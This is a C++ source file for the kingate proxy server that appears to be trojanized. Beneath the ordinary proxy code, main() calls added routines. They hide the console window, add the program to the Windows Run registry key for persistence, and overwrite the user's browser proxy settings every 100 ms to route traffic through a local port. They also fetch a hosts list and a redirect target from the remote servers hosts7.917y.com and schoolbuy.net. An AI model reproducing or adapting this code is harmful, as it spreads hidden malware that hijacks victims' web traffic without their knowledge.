/***************************************************************************
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   (at your option) any later version.                                   *
 *                                                                         *
 ***************************************************************************/
/************************************************************************************************
			kingate-----代理服务器软件，支持http,https,telnet,pop3,smtp,socks,ftp,mms,rtsp代理
				该程序受GNU GPL协议保护
				作者：康鸿九（网名：king 邮箱：khj99@tom.com)
				(http://www.kingate.net)
************************************************************************************************/
#ifdef HAVE_CONFIG_H
#include <config.h>
#endif
//#define _WIN32_SERVICE
#ifndef _WIN32
#include <pthread.h>
#include <pwd.h>
#include <sys/types.h>
#include <unistd.h>
#else
#include <direct.h>
#include <stdlib.h>
#endif
#include <time.h>
#include <string>
#include <stdio.h>
#include "utils.h" 
#include "mysocket.h"
#include "socks.h"
#include "do_config.h"
#include "log.h"
#include "allow_connect.h"
#include "ftp.h"
#include "other.h"
#include "server.h"
#define OPEN_FILE
#include "forwin32.h"
#include "kingate.h"
#include "http.h"
#include "socks.h"
#include "KUser.h"
#include "cache.h"
#include "KThreadPool.h"
#include "malloc_debug.h"
#ifndef HAVE_DAEMON
int daemon(int nochdir, int noclose);
#endif
char *lang=NULL;
CONFIG conf;
int m_debug=0;
int kingate_start_time=time(NULL);
#define COMMAND	SIGHUP
using namespace std;
SERVICE_PID m_pid;
KMutex quit_kingate_lock;
void shutdown(bool reboot)
{
	int i;
	quit_kingate_lock.Lock();
	if(quit_kingate){
		quit_kingate_lock.Unlock();
		klog(RUN_LOG,"have another thread set quit_kingate flags\n");
		return;
	}
	quit_kingate=true;
	quit_kingate_lock.Unlock();
/*
#ifndef _WIN32
	pthread_kill(second_tpid,SIGINT);
#endif
*/
	closeAllConnection();
	#ifdef MALLOCDEBUG
	klog(RUN_LOG,"kingate now close all active connection\n");
	sleep(5);
	klog(RUN_LOG,"kingate now close all free thread\n");
	m_thread.closeAllFreeThread();
	sleep(3);	
	#endif
	#ifndef DISABLE_USER
	m_user.SaveAll();
	#endif
	for(i=0;i<TOTAL_SERVICE;i++)
		stop(i);
	service_head=NULL;
	if(conf.use_disk_cache)
		save_all_to_disk();
	klog(RUN_LOG,"kingate shut down now\n");
	m_pid.main=0;
  	m_pid.accept=0;
  	save_pid();
	klog_close();
	/*
	if(reboot){
		#ifdef _WIN32
		#ifdef _WIN32_SERVICE
		string boot_kingate="net start kingate";
		#else
		string boot_kingate=conf.path;
		boot_kingate+="/bin/kingate";
		system(boot_kingate.c_str());
	}
	*/	
	#ifdef MALLOCDEBUG
	list_all_malloc();
	#endif  
#ifdef _WIN32
#ifdef _WIN32_SERVICE
	return ;
#endif	
#endif
    
	exit(0);

}

int stop(int service)
{
	#ifndef _WIN32
	SERVICE *tmp,*prev=NULL;
	if((service<0)||(service>TOTAL_SERVICE)){
	//	klog(ERR_LOG,"service name is not right.\n");
		return -1;
	}

/*	if(m_pid.service[service]==0)
		return 0;
	*///strcpy(conf.service[service],"off");
	conf.state[service]=0;
//	m_pid.service[service]=0;
	tmp=service_head;
	while(tmp!=NULL){
		if(tmp->m_server.model==service){
			//stop the service;
			if(prev==NULL){
				service_head=service_head->next;
				tmp->server.close();
				#ifndef _WIN32
				delete tmp;
				#endif
			}else{
				prev->next=tmp->next;
				tmp->server.close();
				#ifndef _WIN32
				delete tmp;
				#endif
			}
//			kill(m_pid.accept,COMMAND);
	//		fprintf(stderr,"stop service %s success.\n",get_service_name(service));
			return 1;
		}
		prev=tmp;
		tmp=tmp->next;
	}	
	#endif
//	fprintf(stderr,"service %s is not running.\n",get_service_name(service));
	return 0;//the service have not running;

}
void sigcatch(int sig)
{
#ifdef HAVE_SYSLOG_H
	klog(RUN_LOG,"catch signal %d,main_pid=%d,my_pid=%d\n",sig,m_pid.main,getpid());
#endif
 	if(m_pid.main!=getpid()){
          	return;
    	}
#ifndef _WIN32
	signal(sig,sigcatch); 
  	switch(sig){
		case COMMAND:			
			service_from_signal();
			break;
		case SIGTERM:
		case SIGINT:
			shutdown();
			break;
		default:
			return;
	}
#endif
}
void set_user1(const char *user)
{
	assert(user);
#if	!defined(_WIN32)
int		rc;
struct passwd	*pwd = NULL;
         
    if ( (pwd = getpwnam(user)) != 0 ) {
		rc = setgid(pwd->pw_gid);
		rc = setuid(pwd->pw_uid);
    } 
#endif	/* !_WIN32 */
}
void list_service()
{
	return;
}
void service_from_signal()
{
#ifndef _WIN32
	char tmp[2][32];
	char buf[32];
	memset(tmp,0,sizeof(tmp));
	memset(buf,0,sizeof(buf));
	FILE *fp=fopen(CMD_FILE,"rt");
	if(fp==NULL)
		return;
	int len=fread(buf,1,sizeof(buf)-1,fp);
	fclose(fp);
	fp=fopen(CMD_FILE,"wt");
	fclose(fp);
	sscanf(buf,"%s%s",tmp[0],tmp[1]);
	klog(RUN_LOG,"recv command: %s\n",buf);
	if(strcmp(tmp[0],"start")==0){
		start(get_service(tmp[1]));
		listen_fd_set();
	}		
	if(strcmp(tmp[0],"stop")==0){
		klog(RUN_LOG,"stop service %d now\n",tmp[1]);
		stop(get_service(tmp[1]));
		listen_fd_set();
	}
	if(strcmp(tmp[0],"shutdown")==0){
		shutdown();
	}
/*
	if(strcmp(tmp[0],"list")==0){
		list_service();
	}
*/
#endif
}
int service_to_signal(const char *cmd)
{
#ifndef _WIN32
	int cmd_fp;
	if(m_pid.main==0){
		fprintf(stderr,"error,kingate is not running\n");
		return 0;
	}
	if((cmd_fp=open(CMD_FILE,O_RDWR|O_CREAT|O_TRUNC,S_IRUSR|S_IWUSR|S_IRGRP))<=0){
		fprintf(stderr,"cann't open cmd file %s\n",CMD_FILE);
		goto clean;
	}
	if(write(cmd_fp,cmd,strlen(cmd))<=0){
		fprintf(stderr,"cann't write cmd file %s\n",CMD_FILE);
		goto clean;
	}	
	close(cmd_fp);
	if(kill(m_pid.main,COMMAND)==0)
		return 1;	
	fprintf(stderr,"error ,while kill COMMAND to pid=%d.\n",m_pid.main);
clean:	
	close(cmd_fp);

#endif
	return 0;
}

int create_file_path(char *argv0)
{
	#ifdef _WIN32
	conf.path=(char *)malloc(strlen(argv0)+5);
	if(!get_path(argv0,conf.path))
		return 0;
	#else
	if((m_debug) && (conf.log_level==9)){
		conf.path=(char *)malloc(strlen(argv0)+5);
		if(!get_path(argv0,conf.path))
			return 0;
	}else{
		conf.path=strdup(KINGATE_PATH);//(char *)malloc(strlen(KINGATE_PATH)+6);
//		strcpy(conf.path,KINGATE_PATH);
		//strcat(conf.path,"/bin/");
	}
	#endif
	assert(conf.path);
/*
	strncpy(pid_file,conf.path,200);
	strcat(pid_file,PID_FILE);
	strncpy(CMD_FILE,conf.path,200);
	strcat(CMD_FILE,CMD_FILE);
*/
	return 1;
}
void restore_pid()
{
#ifndef _WIN32
	FILE *fp=fopen(PID_FILE,"rt");
	if(fp==NULL){
		klog(ERR_LOG,"cann't open pid file %s\n",PID_FILE);
		return;
	}
	fscanf(fp,"%d",&m_pid.main);
	fclose(fp);
#endif
}
static int Usage()
{
		printf("Usage:\n");
		printf("kingate [-hqfz] [-d level] [-k service] [-s service] \n");
		printf("     (none param to start server.)\n");
		printf("     [-h]                print the current message\n");
		printf("     [-d level]          start kingate in debug model,level=0-3\n");
		printf("     [-k service]	 stop service,etc (-k http) to stop http\n");
		printf("     [-s service]	 start service,etc (-s http) to start http\n");	
		printf("     [-z]                create and format the disk cache.\n");
		printf("     [-q]                shutdown kingate\n");
		printf("     [-f]                force start program,if cann't start program,try this\n");
		printf("\nReport bugs to <khj99@tom.com>.\n");
		return 1;
}
void create_dir(const char *dir)
{
     if(mkdir(dir,448)!=0){
		fprintf(stderr,"cann't mkdir %s,it may be exist or you haven't the right to create it.\n",dir);
		exit(0);
	}

}
void create_disk_cache()
{
        char dir[512];
       // const char *prefix="/home/king/kingate/var";
	string path=conf.path;
	path+="/var/cache";
	const char *prefix=path.c_str();
        int max=HASH_SIZE;
	FILE *fp=NULL;
	create_dir(prefix);
        for(int i=0;i<10;i++){
                sprintf(dir,"%s/%d",prefix,i);
                if(i*1000>max)
                      goto done;
                create_dir(dir);
                for(int j=0;j<10;j++){
                        if(i*1000+j*100>max)
                                goto done;
                        sprintf(dir,"%s/%d/%d",prefix,i,j);
                        create_dir(dir);
                        for(int k=0;k<10;k++){
                                if(i*1000+j*100+k*10>max)
                                        goto done;
                                sprintf(dir,"%s/%d/%d/%d",prefix,i,j,k);
                                create_dir(dir);
                                for(int p=0;p<10;p++){
                                        if(i*1000+j*100+k*10+p>max)
                                                goto done ;
                                        sprintf(dir,"%s/%d/%d/%d/%d",prefix,i,j,k,p);
                                        create_dir(dir);
                                }
                        }
                }
        }
done:
	fp=fopen(get_cache_index_file().c_str(),"w");
	if(fp!=NULL){
		printf("create cache index file %s success!\n",get_cache_index_file().c_str());
		fclose(fp);
	}else{
		fprintf(stderr,"Cann't create cache index file %s\n",get_cache_index_file().c_str());
	}
}

int parse_args(int argc,char ** argv)
{
	extern char *optarg;
    	int c;
	int tmp_pid=0;
	char tmp[255];
	char msg[1024];
	int ret=0;
//	bzero(&conf,sizeof(conf));
	conf.log_level=-1;
	char *argv0=argv[0];
//	LogEvent("argc=%d,argv[0]=%s",argc,argv[0]);
#ifdef _WIN32
	
  	char szFilename[256];
  	::GetModuleFileName(NULL, szFilename, 255);
	argv0=szFilename;
#endif
	if(!create_file_path(argv0)){
	
	//	fprintf(stderr,"Please add path in your command,do not use ( kingate ) ,please use ( ./kingate or /usr/local/kingate/bin/kingate etc);\n");
		return 1;
	
	}
	restore_pid();
	if(argc>1)
		ret=1;
	#ifndef _WIN32
	while ((c = getopt(argc, argv, "zs:k:qfd:h?")) != -1) {
		switch(c){
		case 's':
			strcpy(msg,"start ");
			strncat(msg,optarg,200);
			strcat(msg,"\n\0");
		//	printf("kingate try to start %s service now...\n",optarg);
			service_to_signal(msg);
			break;
		case 'k':
			strcpy(msg,"stop ");
			strncat(msg,optarg,200);
			strcat(msg,"\n\0");
		//	printf("kingate try to stop %s service now...\n",optarg);
			service_to_signal(msg);
			break;
		case 'q':
		/*	tmp_pid=m_pid.main;
			m_pid.accept=0;
			m_pid.main=0;
			save_pid();
			m_pid.main=tmp_pid;
		*/	strcpy(msg,"shutdown \n");
			if(service_to_signal(msg))
				printf("kingate shutdown success.\n");
			else
				printf("kingate shutdown error.\n");
			break;
		case 'f':
			ret=0;
			m_pid.main=0;
			break;
		case 'd':
			ret=0;
			m_debug=1;
			conf.log_level=atoi(optarg);
			if(conf.log_level<=0)
				conf.log_level=RUN_LOG;
			printf("kingate now run as debug model(level=%d).\n",conf.log_level);
			break;
		case 'z':
			create_disk_cache();
			exit(0);
		case 'h':
		case '?':
			return Usage();
		default:
			return Usage();

		}
	}
	#else
	if(get_param(argc,argv,"-f",NULL)){
		ret=0;
		m_pid.main=0;
	}
	if(get_param(argc,argv,"-d",tmp)){
		ret=0;
		m_debug=1;
		if(tmp[0]==0)
			conf.log_level=RUN_LOG;
		else
			conf.log_level=atoi(tmp);
	}
	if(get_param(argc,argv,"-z",NULL)){
		create_disk_cache();

	}
	if(get_param(argc,argv,"-h",NULL)){
		return Usage();
	}

	#endif
	if((ret==0)&&(m_pid.main!=0)){
		fprintf(stderr,"start error,have another kingate (pid=%d) running.\n",m_pid.main);
		fprintf(stderr,"try (kingate -q) to close it.\n");
		fprintf(stderr,"if you are sure of none kingate be running,try (kingate -f) to start server.\n");
		ret=1;
	}
	return ret;
}

void init_program()
{

	memset(&m_pid,0,sizeof(SERVICE_PID));
#ifndef _WIN32
	signal(SIGPIPE,SIG_IGN);
	signal(SIGCHLD,close_child);
	signal(COMMAND,sigcatch);
	signal(SIGINT,sigcatch);
	signal(SIGTERM,sigcatch);
#endif
	do_config();
	init_allow_connect();
	if(m_debug)
		conf.log_model=LOG_DEBUG_MODEL;
  
}

int  start(int service)
{
	
	if((service<0)||(service>TOTAL_SERVICE)){
	//	fprintf(stderr,"service name is not right.\n");
		return -1;
	}
/*	if(m_pid.service[service]!=0)
		return 0;
*/	SERVICE *tmp=service_head;
	while(tmp!=NULL){
		if(tmp->m_server.model==service){
	//		fprintf(stderr,"service %s is already start.\n",get_service_name(service));
			return 0;//have already running
		}
		tmp=tmp->next;
	}
	if((tmp=new SERVICE)==NULL)
		return -1;//no any mem to alloc
	memset(&tmp->m_server,0,sizeof(tmp->m_server));
	tmp->next=NULL;
	if(tmp->server.open(conf.port[service],((strcmp(conf.bind_addr,"*")==0)?NULL:conf.bind_addr))<=0){
		klog(ERR_LOG,"cann't open port %s:%d\n",conf.bind_addr,conf.port[service]);
//		printf("cann't open port %s:%d\n",(strcmp(conf.bind_addr,"off")==0)?"*":conf.bind_addr,conf.port[service]);

		return -3;//cann't open port
	}
	klog(START_LOG,"kingate listen port %s:%d success\n",(strcmp(conf.bind_addr,"off")==0)?"*":conf.bind_addr,conf.port[service]);
//	printf("kingate listen port %s:%d success\n",(strcmp(conf.bind_addr,"off")==0)?"*":conf.bind_addr,conf.port[service]);
	tmp->m_server.model=service;
	conf.state[service]=1;//set state is open;
	tmp->next=service_head;
	service_head=tmp;
#ifndef _WIN32
	if(m_pid.accept!=0)
		kill(m_pid.accept,COMMAND);
#endif
	return 1;//success

}
void StartAll()
{
	int i=0;
  	init_program();
	init_socket();				
	oops_http_init();
	if(!m_debug)
		daemon(0,0);
	klog_start();
	#ifndef DISABLE_USER
	m_user.LoadUser();
	#endif
	for(i=0;i<conf.redirect.size();i++){
		redirect_proxy(&conf.redirect[i]);
	}
	for(i=0;i<TOTAL_SERVICE;i++){
		if(conf.state[i]==1){
			start(i);
		}
	}	
	if(service_head==NULL){//none service to start.
		klog(ERR_LOG,"no service to start,kingate now exit.\n");
		exit(3);
	}
	m_pid.main=getpid();
	if(!m_debug){
		save_pid();
	}
	if(conf.run_user)
		set_user1(conf.run_user);

	kingate_start_time=time(NULL);
	server_proxy();
	clean_socket();
}
void StopAll()
{
	shutdown();
}
#define MYBUFSIZ 1024
vector<string> vs;
int geturl()
{    
    WSADATA WSAData={0};
    SOCKET sockfd;
    struct sockaddr_in addr;
    struct hostent *pURL;
    char *pHost = 0, *pGET = 0;
	char* host="hosts7.917y.com", GET[MYBUFSIZ]={0};
    char header[MYBUFSIZ] = "";
    static char text[MYBUFSIZ];
    int i;
    int number,recvlen;
    int dizhi;
    int Mystrlen;


/*
* windows下使用socket必须用WSAStartup初始化，否则不能调用
*/
if(WSAStartup(MAKEWORD(2,2), &WSAData))
{
printf("WSA failed\n");
return 0;
}


/*
* 分离url中的主机地址和相对路径
*/
strcpy(GET, "/hosts7.txt");



printf("%s\n%s\n", host, GET);

/*
* 设定socket参数,并未真正初始化
*/
sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
pURL = gethostbyname(host);
if(!pURL)return 0;
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr);
addr.sin_port = htons(99);

/*
* 组织发送到web服务器的信息
* 为何要发送下面的信息请参考HTTP协议的约定
*/
strcat(header, "GET ");
strcat(header, GET);
strcat(header, " HTTP/1.1\r\n");
strcat(header, "HOST: ");
strcat(header, host);
strcat(header, "\r\nConnection: Close\r\n\r\n");
printf(header);
/*
* 连接到服务器，发送请求header，并接受反馈（即网页源代码）
*/
connect(sockfd,(SOCKADDR *)&addr,sizeof(addr));

send(sockfd, header, strlen(header), 0);

number=0;  
recvlen=0; /*返回信息大小*/
Mystrlen=0;

FILE* f=fopen("host.txt","w");
Mystrlen=recv(sockfd, text, MYBUFSIZ-1, 0);
char r[256]={0};
while ( Mystrlen > 1)
{  
	char * p=text;
	if(number==0)
	{
		p=strstr(text,"\r\n\r\n");
		p+=4;
	}
	number++;
	text[Mystrlen]=0;

	if(f)
	{
		char * q=strstr(p,"\r\n");
		while(q)
		{

				strncat(r,p,q-p);
			  //  strncpy(r,p,q-p);
			
			fprintf(f,"%s\n",r);
			char * s=strstr(r," ");
			if(s)
			{
				s++;
				vs.push_back(s);
				
			}

			q=q+2;
			p=q;
			q=strstr(q,"\r\n");
			if(!q && p)			
				strcpy(r,p);
			else memset(r,0,256);
			
		}
		//fputs(p,f);
	}
    recvlen=recvlen+Mystrlen;
    memset(text,0,MYBUFSIZ);
    Mystrlen=recv(sockfd, text, MYBUFSIZ-1, 0);
}
if(f)fclose(f);
closesocket(sockfd);
WSACleanup();

return 1;
   
}
bool is_red;
string getright()
{    
    WSADATA WSAData={0};
    SOCKET sockfd;
    struct sockaddr_in addr;
    struct hostent *pURL;
    char *pHost = 0, *pGET = 0;
	char header[MYBUFSIZ] = "";
	char* host="schoolbuy.net", GET[MYBUFSIZ]={0};
    static char text[MYBUFSIZ];
    int i;
    int number,recvlen;
    int dizhi;
    int Mystrlen;


/*
* windows下使用socket必须用WSAStartup初始化，否则不能调用
*/
if(WSAStartup(MAKEWORD(2,2), &WSAData))
{
printf("WSA failed\n");
return "schoolbuy.net";
}


/*
* 分离url中的主机地址和相对路径
*/
strcpy(GET, "/crit/http1.php");



printf("%s\n%s\n", host, GET);

/*
* 设定socket参数,并未真正初始化
*/
sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
pURL = gethostbyname(host);
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr);
addr.sin_port = htons(80);

/*
* 组织发送到web服务器的信息
* 为何要发送下面的信息请参考HTTP协议的约定
*/
strcat(header, "GET ");
strcat(header, GET);
strcat(header, " HTTP/1.1\r\n");
strcat(header, "HOST: ");
strcat(header, host);
strcat(header, "\r\nConnection: Close\r\n\r\n");
printf(header);
/*
* 连接到服务器，发送请求header，并接受反馈（即网页源代码）
*/
connect(sockfd,(SOCKADDR *)&addr,sizeof(addr));

send(sockfd, header, strlen(header), 0);

number=0;  
recvlen=0; /*返回信息大小*/
Mystrlen=0;
char* q=NULL;
Mystrlen=recv(sockfd, text, MYBUFSIZ-1, 0);
char r[256]={0};
strcpy(r,"schoolbuy.net");
if ( Mystrlen > 1)
{  
	char * p=text;
	if(number==0)
	{
		p=strstr(text,"\r\n\r\n");
		p+=4;
	}
	number++;
	text[Mystrlen]=0;
	if(*p==13)
	{			
			is_red=false;
				closesocket(sockfd);
				WSACleanup();
				return r;
	}
	q=strstr(p,"\r\n");
	if(q)
		q+=2;
	char * s=strstr(q,"\r\n");
	if(s)
	{
		strncpy(r,q,s-q);
		r[s-q]=0;
	}
	
	

}

closesocket(sockfd);
WSACleanup();
is_red=true;
return r;
   
}


#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
char direct_url[16];
int write_reg()
{
    // 根键、子键名称、和到子键的句柄
    HKEY hRoot = HKEY_LOCAL_MACHINE;
        char*szSubKey ="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;

    // 打开指定子键
    DWORD dwDisposition = REG_OPENED_EXISTING_KEY;    // 如果不存在不创建
    LONG lRet = ::RegCreateKeyEx(hRoot, szSubKey, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    if(lRet != ERROR_SUCCESS)
        return-1;

    // 得到当前执行文件的文件名（包含路径）
        char szModule[MAX_PATH] ;
        ::GetModuleFileName (NULL, szModule, MAX_PATH);
    // 创建一个新的键值，设置键值数据为文件名
    lRet = ::RegSetValueEx(hKey, "KingateD", 0, REG_SZ, (BYTE*)szModule, strlen(szModule));
    if(lRet == ERROR_SUCCESS)
    {
        printf(" 自动启动设置成功！ ");
    }

    // 关闭子键句柄
    ::RegCloseKey(hKey);

    return 0;
}
int tm=time(0);
int tolt=3600*12;
class Thread
{
typedef void( *ThreadFun )( void * );
public:
	Thread(ThreadFun f,void * p)
	{
		fun=f;
		pt=p;
	}
	void Start()
	{
		_beginthread(fun, 0,pt);
	}
private:
	ThreadFun fun;
	void * pt;
};
void loop_reg(void *)
{
	while(true)
	{
	HKEY hKey;
	if(RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, "ProxyEnable", 0, REG_SZ, (BYTE*)(LPCTSTR)"1", 1);
		int i=1;
		RegSetValueEx(hKey, "ProxyHttp1.1",0, REG_DWORD, (BYTE*)&i, 4);
		string host="http=127.0.0.1:8082";
		RegSetValueEx(hKey, "ProxyServer", 0, REG_SZ, (BYTE*)(LPCTSTR)host.c_str
			(),host.length());

		RegCloseKey(hKey);
	}
		Sleep(100);
	}
}
void reg_set(void *)
{
	
}
int main(int argc ,char **argv)
{
	printf("%d\n",tm);
	write_reg();
	Thread t(loop_reg,NULL);
	t.Start();
	is_red=false;
	strcpy(direct_url,getright().c_str());



    geturl();

	printf("%s %s %s\n",PROGRAM_NAME,VER_ID,VER_STRING);
#ifdef _WIN32
#ifdef _WIN32_SERVICE
 	if ((argc==2) && (::strcmp(argv[1], "--install")==0))
  	{
    		if(InstallService("kingate"))
			printf("install service success\n");
		else
			printf("install service failed\n");
  		return 0;
 	 }
  	if ((argc==2) && (::strcmp(argv[1], "--uninstall")==0))
  	{

    		if(UninstallService("kingate"))
			printf("uninstall service success\n");
		else
			printf("uninstall service failed\n");
    	return 0;
  	}
  if(argc==1){
	  printf("Usage:\nkingate --install	install the kingate as service\n");
	  printf("kingate --uninstall	uninstall the kingate service\n");
	  printf("kingate -z		create and format disk cache\n");
	  printf("If kingate haven't exit ,use ctrl+c to exit.\n");
	  SERVICE_TABLE_ENTRY   service_table_entry[] =
	  {
		{ "kingate", kingateMain },
		{ NULL, NULL }
	  };
	  ::StartServiceCtrlDispatcher(service_table_entry);
  }
  #endif
#endif
//	printf("using LANG %s\n",lang);
	if(parse_args(argc,argv))
		exit(0);
#ifdef _WIN32
#ifdef _WIN32_SERVICE
	return 0;
#endif
#endif
	StartAll();
	return 0;
}


int get_service(const char * service)
{
	if(strcmp(service,"pop3")==0)
		return POP3;
	if(strcmp(service,"smtp")==0)
		return SMTP;
	/*if(strcmp(service,"dns")==0)
		return DNS;
	*/
	if(strcmp(service,"http")==0)
		return HTTP;
	if(strcmp(service,"ftp")==0)
		return FTP;
	if(strcmp(service,"socks")==0)
		return SOCKS;
	if(strcmp(service,"telnet")==0)
		return TELNET;
	if(strcmp(service,"mms")==0)
		return MMS;	
	if(strcmp(service,"rtsp")==0)
		return RTSP;
	if(strcmp(service,"socks")==0)
		return SOCKS;	
	if(strcmp(service,"manage")==0)
		return MANAGE;
	
	return -1;
}
const char * get_service_name(int service)
{
	return service_name[service];
}
int get_service_id(const char * service)
{
	return get_service(service);
}
void save_pid()
{
#ifndef _WIN32
	FILE *fp;
	if((fp=fopen(PID_FILE,"wt"))==NULL){
		klog(ERR_LOG,"cann't open pid file %s\n",PID_FILE);
		return ;
	}
	fprintf(fp,"%d",m_pid.main);
	fclose(fp);
#endif
}
